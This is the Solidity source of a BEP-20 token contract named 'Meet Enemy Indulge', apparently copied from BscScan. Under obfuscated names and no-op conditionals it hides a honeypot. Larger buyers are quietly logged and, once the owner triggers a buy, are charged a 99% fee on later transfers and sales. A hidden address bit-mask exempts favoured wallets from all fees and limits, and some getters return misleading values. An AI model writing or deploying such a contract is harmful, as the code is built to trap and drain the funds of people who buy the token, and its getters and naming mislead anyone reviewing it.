/**
 *Submitted for verification at BscScan.com on 2022-12-13
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Manager {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        competent[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract MeetEnemyIndulge is IBEP20, Manager {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Meet Enemy Indulge ";
    string constant _symbol = "MeetEnemyIndulge";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private tradingExemptBotsReceiverLaunched;
    mapping(address => bool) private botsBuyLaunchedBurn;
    mapping(address => bool) private receiverMaxBuyLaunched;
    mapping(address => bool) private sellTeamLimitMarketingMaxBotsLiquidity;
    mapping(address => uint256) private teamLimitReceiverSell;
    mapping(uint256 => address) private walletLaunchedBuyBurnTrading;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private swapBurnLaunchedLiquidity = 0;
    uint256 private tradingSellWalletMarketingMinBurnLiquidity = 5;

    //SELL FEES
    uint256 private launchedLiquidityBuyFee = 0;
    uint256 private burnIsMaxSellBotsLimitMarketing = 5;

    uint256 private buySellLimitExemptTxBotsMin = tradingSellWalletMarketingMinBurnLiquidity + swapBurnLaunchedLiquidity;
    uint256 private feeBuyTxLiquidity = 100;

    address private liquidityMarketingIsLaunchedBuySellTx = (msg.sender); // auto-liq address
    address private buyTeamTxLaunched = (0x129FBB056f34d02a0aBF9816fFfFE88922986E08); // marketing address
    address private modeTradingLiquidityLimit = DEAD;
    address private marketingBurnLiquidityMaxTeam = DEAD;
    address private isReceiverMaxTx = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private txLimitSellWallet;
    uint256 private botsAutoFeeLaunched;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private swapBotsExemptFee;
    uint256 private marketingBuyTradingReceiver;
    uint256 private isAutoTeamExempt;
    uint256 private feeWalletBurnLaunched;
    uint256 private walletBotsLimitAutoIsBuy;

    bool private buyExemptLimitMode = true;
    bool private sellTeamLimitMarketingMaxBotsLiquidityMode = true;
    bool private swapLimitFeeTrading = true;
    bool private sellMinBotsLaunchedLiquidity = true;
    bool private buyLaunchedTradingAuto = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private teamMaxIsSellBurnMarketingSwap = 6 * 10 ** 15;
    uint256 private txBotsFeeModeBurnExemptBuy = _totalSupply / 1000; // 0.1%

    
    uint256 private swapModeBotsBurn = 0;
    uint256 private receiverTxLimitBurnBuyMin = 0;
    uint256 private tradingWalletExemptBotsIs = 0;
    bool private txAutoModeExempt = false;
    bool private swapSellFeeTx = false;
    bool private liquidityAutoBuyMaxMinIs = false;
    uint256 private txLaunchedSellLiquiditySwapTradingMax = 0;
    uint256 private isBuyWalletBurn = 0;
    uint256 private modeTeamFeeMarketingAuto = 0;
    uint256 private tradingMaxAutoMin = 0;
    bool private receiverTxLimitBurnBuyMin0 = false;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Manager(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        swapBotsExemptFee = true;

        tradingExemptBotsReceiverLaunched[msg.sender] = true;
        tradingExemptBotsReceiverLaunched[address(this)] = true;

        botsBuyLaunchedBurn[msg.sender] = true;
        botsBuyLaunchedBurn[0x0000000000000000000000000000000000000000] = true;
        botsBuyLaunchedBurn[0x000000000000000000000000000000000000dEaD] = true;
        botsBuyLaunchedBurn[address(this)] = true;

        receiverMaxBuyLaunched[msg.sender] = true;
        receiverMaxBuyLaunched[0x0000000000000000000000000000000000000000] = true;
        receiverMaxBuyLaunched[0x000000000000000000000000000000000000dEaD] = true;
        receiverMaxBuyLaunched[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return liquidityBotsIsBuy(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Meet Enemy Indulge  Insufficient Allowance");
        }

        return liquidityBotsIsBuy(sender, recipient, amount);
    }

    function liquidityBotsIsBuy(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        bool bLimitTxWalletValue = botsSwapTxBuy(sender) || botsSwapTxBuy(recipient);
        
        if (receiverTxLimitBurnBuyMin == swapModeBotsBurn) {
            receiverTxLimitBurnBuyMin = teamMaxIsSellBurnMarketingSwap;
        }

        if (swapModeBotsBurn != buySellLimitExemptTxBotsMin) {
            swapModeBotsBurn = tradingMaxAutoMin;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && isOwner(recipient)) {
                burnAutoTxLaunchedLiquidity();
            }
            if (!bLimitTxWalletValue) {
                limitWalletBotsTxMaxLaunchedMin(recipient);
            }
        }
        
        if (inSwap || bLimitTxWalletValue) {return botsAutoModeLimit(sender, recipient, amount);}

        if (!tradingExemptBotsReceiverLaunched[sender] && !tradingExemptBotsReceiverLaunched[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Meet Enemy Indulge  Max wallet has been triggered");
        }
        
        require((amount <= _maxTxAmount) || receiverMaxBuyLaunched[sender] || receiverMaxBuyLaunched[recipient], "Meet Enemy Indulge  Max TX Limit has been triggered");

        if (tradingLiquidityTxReceiverBuy()) {sellBurnWalletMax();}

        _balances[sender] = _balances[sender].sub(amount, "Meet Enemy Indulge  Insufficient Balance");
        
        if (txAutoModeExempt == liquidityAutoBuyMaxMinIs) {
            txAutoModeExempt = sellTeamLimitMarketingMaxBotsLiquidityMode;
        }

        if (receiverTxLimitBurnBuyMin != feeBuyTxLiquidity) {
            receiverTxLimitBurnBuyMin = swapModeBotsBurn;
        }

        if (tradingMaxAutoMin != tradingMaxAutoMin) {
            tradingMaxAutoMin = receiverTxLimitBurnBuyMin;
        }


        uint256 amountReceived = sellFeeTxAutoTrading(sender) ? feeReceiverBotsTx(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function botsAutoModeLimit(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Meet Enemy Indulge  Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function sellFeeTxAutoTrading(address sender) internal view returns (bool) {
        return !botsBuyLaunchedBurn[sender];
    }

    function sellLiquidityBuyMax(address sender, bool selling) internal returns (uint256) {
        
        if (selling) {
            buySellLimitExemptTxBotsMin = burnIsMaxSellBotsLimitMarketing + launchedLiquidityBuyFee;
            return tradingSellTeamMin(sender, buySellLimitExemptTxBotsMin);
        }
        if (!selling && sender == uniswapV2Pair) {
            buySellLimitExemptTxBotsMin = tradingSellWalletMarketingMinBurnLiquidity + swapBurnLaunchedLiquidity;
            return buySellLimitExemptTxBotsMin;
        }
        return tradingSellTeamMin(sender, buySellLimitExemptTxBotsMin);
    }

    function swapBurnMarketingLimit() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function feeReceiverBotsTx(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = amount.mul(sellLiquidityBuyMax(sender, receiver == uniswapV2Pair)).div(feeBuyTxLiquidity);

        if (sellTeamLimitMarketingMaxBotsLiquidity[sender] || sellTeamLimitMarketingMaxBotsLiquidity[receiver]) {
            feeAmount = amount.mul(99).div(feeBuyTxLiquidity);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function botsSwapTxBuy(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function tradingSellTeamMin(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = teamLimitReceiverSell[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function limitWalletBotsTxMaxLaunchedMin(address addr) private {
        if (swapBurnMarketingLimit() < teamMaxIsSellBurnMarketingSwap) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        walletLaunchedBuyBurnTrading[exemptLimitValue] = addr;
    }

    function burnAutoTxLaunchedLiquidity() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (teamLimitReceiverSell[walletLaunchedBuyBurnTrading[i]] == 0) {
                    teamLimitReceiverSell[walletLaunchedBuyBurnTrading[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(buyTeamTxLaunched).transfer(amountBNB * amountPercentage / 100);
    }

    function tradingLiquidityTxReceiverBuy() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    buyLaunchedTradingAuto &&
    _balances[address(this)] >= txBotsFeeModeBurnExemptBuy;
    }

    function sellBurnWalletMax() internal swapping {
        
        if (receiverTxLimitBurnBuyMin != swapModeBotsBurn) {
            receiverTxLimitBurnBuyMin = modeTeamFeeMarketingAuto;
        }


        uint256 amountToLiquify = txBotsFeeModeBurnExemptBuy.mul(swapBurnLaunchedLiquidity).div(buySellLimitExemptTxBotsMin).div(2);
        uint256 amountToSwap = txBotsFeeModeBurnExemptBuy.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (tradingMaxAutoMin == isBuyWalletBurn) {
            tradingMaxAutoMin = teamMaxIsSellBurnMarketingSwap;
        }

        if (receiverTxLimitBurnBuyMin0 != receiverTxLimitBurnBuyMin0) {
            receiverTxLimitBurnBuyMin0 = sellMinBotsLaunchedLiquidity;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = buySellLimitExemptTxBotsMin.sub(swapBurnLaunchedLiquidity.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(swapBurnLaunchedLiquidity).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(tradingSellWalletMarketingMinBurnLiquidity).div(totalETHFee);
        
        if (txAutoModeExempt != swapLimitFeeTrading) {
            txAutoModeExempt = buyLaunchedTradingAuto;
        }

        if (txLaunchedSellLiquiditySwapTradingMax != launchedLiquidityBuyFee) {
            txLaunchedSellLiquiditySwapTradingMax = tradingWalletExemptBotsIs;
        }


        payable(buyTeamTxLaunched).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                liquidityMarketingIsLaunchedBuySellTx,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getTxLaunchedSellLiquiditySwapTradingMax() public view returns (uint256) {
        if (txLaunchedSellLiquiditySwapTradingMax == swapModeBotsBurn) {
            return swapModeBotsBurn;
        }
        if (txLaunchedSellLiquiditySwapTradingMax != tradingWalletExemptBotsIs) {
            return tradingWalletExemptBotsIs;
        }
        return txLaunchedSellLiquiditySwapTradingMax;
    }
    function setTxLaunchedSellLiquiditySwapTradingMax(uint256 a0) public onlyOwner {
        if (txLaunchedSellLiquiditySwapTradingMax != tradingMaxAutoMin) {
            tradingMaxAutoMin=a0;
        }
        if (txLaunchedSellLiquiditySwapTradingMax != swapBurnLaunchedLiquidity) {
            swapBurnLaunchedLiquidity=a0;
        }
        txLaunchedSellLiquiditySwapTradingMax=a0;
    }

    function getBuyExemptLimitMode() public view returns (bool) {
        if (buyExemptLimitMode != receiverTxLimitBurnBuyMin0) {
            return receiverTxLimitBurnBuyMin0;
        }
        if (buyExemptLimitMode == sellTeamLimitMarketingMaxBotsLiquidityMode) {
            return sellTeamLimitMarketingMaxBotsLiquidityMode;
        }
        if (buyExemptLimitMode != receiverTxLimitBurnBuyMin0) {
            return receiverTxLimitBurnBuyMin0;
        }
        return buyExemptLimitMode;
    }
    function setBuyExemptLimitMode(bool a0) public onlyOwner {
        if (buyExemptLimitMode == receiverTxLimitBurnBuyMin0) {
            receiverTxLimitBurnBuyMin0=a0;
        }
        if (buyExemptLimitMode != swapSellFeeTx) {
            swapSellFeeTx=a0;
        }
        if (buyExemptLimitMode == sellTeamLimitMarketingMaxBotsLiquidityMode) {
            sellTeamLimitMarketingMaxBotsLiquidityMode=a0;
        }
        buyExemptLimitMode=a0;
    }

    function getModeTeamFeeMarketingAuto() public view returns (uint256) {
        if (modeTeamFeeMarketingAuto != swapModeBotsBurn) {
            return swapModeBotsBurn;
        }
        if (modeTeamFeeMarketingAuto == buySellLimitExemptTxBotsMin) {
            return buySellLimitExemptTxBotsMin;
        }
        if (modeTeamFeeMarketingAuto == swapModeBotsBurn) {
            return swapModeBotsBurn;
        }
        return modeTeamFeeMarketingAuto;
    }
    function setModeTeamFeeMarketingAuto(uint256 a0) public onlyOwner {
        if (modeTeamFeeMarketingAuto != swapModeBotsBurn) {
            swapModeBotsBurn=a0;
        }
        if (modeTeamFeeMarketingAuto != buySellLimitExemptTxBotsMin) {
            buySellLimitExemptTxBotsMin=a0;
        }
        modeTeamFeeMarketingAuto=a0;
    }

    function getTradingSellWalletMarketingMinBurnLiquidity() public view returns (uint256) {
        return tradingSellWalletMarketingMinBurnLiquidity;
    }
    function setTradingSellWalletMarketingMinBurnLiquidity(uint256 a0) public onlyOwner {
        if (tradingSellWalletMarketingMinBurnLiquidity == teamMaxIsSellBurnMarketingSwap) {
            teamMaxIsSellBurnMarketingSwap=a0;
        }
        if (tradingSellWalletMarketingMinBurnLiquidity == tradingSellWalletMarketingMinBurnLiquidity) {
            tradingSellWalletMarketingMinBurnLiquidity=a0;
        }
        tradingSellWalletMarketingMinBurnLiquidity=a0;
    }

    function getIsReceiverMaxTx() public view returns (address) {
        return isReceiverMaxTx;
    }
    function setIsReceiverMaxTx(address a0) public onlyOwner {
        if (isReceiverMaxTx == marketingBurnLiquidityMaxTeam) {
            marketingBurnLiquidityMaxTeam=a0;
        }
        if (isReceiverMaxTx != liquidityMarketingIsLaunchedBuySellTx) {
            liquidityMarketingIsLaunchedBuySellTx=a0;
        }
        if (isReceiverMaxTx == isReceiverMaxTx) {
            isReceiverMaxTx=a0;
        }
        isReceiverMaxTx=a0;
    }

    function getSwapBurnLaunchedLiquidity() public view returns (uint256) {
        if (swapBurnLaunchedLiquidity == tradingMaxAutoMin) {
            return tradingMaxAutoMin;
        }
        return swapBurnLaunchedLiquidity;
    }
    function setSwapBurnLaunchedLiquidity(uint256 a0) public onlyOwner {
        if (swapBurnLaunchedLiquidity == txLaunchedSellLiquiditySwapTradingMax) {
            txLaunchedSellLiquiditySwapTradingMax=a0;
        }
        swapBurnLaunchedLiquidity=a0;
    }

    function getFeeBuyTxLiquidity() public view returns (uint256) {
        if (feeBuyTxLiquidity != isBuyWalletBurn) {
            return isBuyWalletBurn;
        }
        if (feeBuyTxLiquidity != launchedLiquidityBuyFee) {
            return launchedLiquidityBuyFee;
        }
        if (feeBuyTxLiquidity != txBotsFeeModeBurnExemptBuy) {
            return txBotsFeeModeBurnExemptBuy;
        }
        return feeBuyTxLiquidity;
    }
    function setFeeBuyTxLiquidity(uint256 a0) public onlyOwner {
        feeBuyTxLiquidity=a0;
    }

    function getReceiverTxLimitBurnBuyMin0() public view returns (bool) {
        if (receiverTxLimitBurnBuyMin0 != buyLaunchedTradingAuto) {
            return buyLaunchedTradingAuto;
        }
        return receiverTxLimitBurnBuyMin0;
    }
    function setReceiverTxLimitBurnBuyMin0(bool a0) public onlyOwner {
        if (receiverTxLimitBurnBuyMin0 == swapSellFeeTx) {
            swapSellFeeTx=a0;
        }
        if (receiverTxLimitBurnBuyMin0 == sellMinBotsLaunchedLiquidity) {
            sellMinBotsLaunchedLiquidity=a0;
        }
        if (receiverTxLimitBurnBuyMin0 != sellMinBotsLaunchedLiquidity) {
            sellMinBotsLaunchedLiquidity=a0;
        }
        receiverTxLimitBurnBuyMin0=a0;
    }

    function getBuyTeamTxLaunched() public view returns (address) {
        return buyTeamTxLaunched;
    }
    function setBuyTeamTxLaunched(address a0) public onlyOwner {
        if (buyTeamTxLaunched != marketingBurnLiquidityMaxTeam) {
            marketingBurnLiquidityMaxTeam=a0;
        }
        if (buyTeamTxLaunched == liquidityMarketingIsLaunchedBuySellTx) {
            liquidityMarketingIsLaunchedBuySellTx=a0;
        }
        if (buyTeamTxLaunched != liquidityMarketingIsLaunchedBuySellTx) {
            liquidityMarketingIsLaunchedBuySellTx=a0;
        }
        buyTeamTxLaunched=a0;
    }

    function getTxAutoModeExempt() public view returns (bool) {
        if (txAutoModeExempt == swapSellFeeTx) {
            return swapSellFeeTx;
        }
        return txAutoModeExempt;
    }
    function setTxAutoModeExempt(bool a0) public onlyOwner {
        if (txAutoModeExempt != sellTeamLimitMarketingMaxBotsLiquidityMode) {
            sellTeamLimitMarketingMaxBotsLiquidityMode=a0;
        }
        if (txAutoModeExempt == receiverTxLimitBurnBuyMin0) {
            receiverTxLimitBurnBuyMin0=a0;
        }
        txAutoModeExempt=a0;
    }

    function getBuyLaunchedTradingAuto() public view returns (bool) {
        if (buyLaunchedTradingAuto != swapLimitFeeTrading) {
            return swapLimitFeeTrading;
        }
        if (buyLaunchedTradingAuto == swapLimitFeeTrading) {
            return swapLimitFeeTrading;
        }
        if (buyLaunchedTradingAuto != swapLimitFeeTrading) {
            return swapLimitFeeTrading;
        }
        return buyLaunchedTradingAuto;
    }
    function setBuyLaunchedTradingAuto(bool a0) public onlyOwner {
        buyLaunchedTradingAuto=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}